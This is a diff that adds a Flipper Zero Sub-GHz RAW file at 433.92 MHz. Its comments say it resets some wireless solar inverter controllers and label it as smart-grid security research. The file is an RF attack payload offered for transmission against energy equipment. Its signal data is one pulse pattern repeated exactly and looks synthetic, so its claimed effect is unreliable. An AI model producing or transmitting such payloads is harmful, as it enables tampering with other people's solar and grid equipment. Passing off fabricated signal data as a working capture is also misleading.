@@ -1,0 +1,9 @@
+Filetype: Flipper SubGhz RAW File
+Version: 1
+Frequency: 433920000
+Preset: FuriHalSubGhzPresetOok650Async
+Protocol: RAW
+# NullSec - Solar Panel Inverter Reset
+# Resets some wireless solar inverter controllers
+# For smart grid security research
+RAW_Data: 450 -900 450 -450 900 -450 450 -900 450 -450 450 -450 900 -900 450 -450 900 -450 450 -900 450 -450 450 -450 900 -900 450 -450 900 -450 450 -900 450 -450 450 -450 900 -900 450 -450 900 -450 450 -900 450 -450 450 -450 900 -900 450 -450 900 -450 450 -900 450 -450 450 -450 900 -900 450 -450 900 -450
